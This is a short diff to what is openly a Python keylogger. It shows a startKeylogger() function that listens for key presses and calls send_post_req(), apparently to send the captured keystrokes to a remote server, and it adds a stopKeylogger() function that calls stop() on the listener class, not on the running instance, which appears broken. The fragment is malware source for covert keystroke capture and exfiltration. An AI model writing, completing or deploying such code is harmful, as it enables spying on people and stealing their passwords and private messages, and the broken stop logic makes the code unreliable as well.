@@ -50,3 +50,6 @@ def startKeylogger():
     with keyboard.Listener(on_press=on_press) as listener:
         send_post_req()
         listener.join()
+
+def stopKeylogger():
+    keyboard.Listener.stop()
